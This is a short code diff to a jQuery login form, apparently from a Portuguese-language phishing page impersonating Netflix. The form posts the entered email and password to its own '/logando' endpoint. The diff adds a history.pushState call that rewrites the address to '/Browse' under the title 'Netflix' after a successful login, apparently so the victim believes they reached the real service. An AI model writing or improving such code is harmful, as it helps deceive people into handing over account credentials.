@@ -48,6 +48,7 @@ $("input").click(function(){
 $("#go").click(function(){
     var email = $("#email").val();
     var senha = $("#senha").val();
+    var stateObj = { foo: "bar" };
     var error = '';
     if(passoEmail === 1){
     $.post("/logando", {email: email, password: senha},
@@ -63,6 +64,7 @@ $("#go").click(function(){
              else if(data == 'sucess'){
                 $(".errorfixed").hide();
                 error = 'Aguarde um momento';
+                history.pushState(stateObj, "Netflix", "/Browse");
                 location.reload();
              }
              $(".errorfixed").html(error);
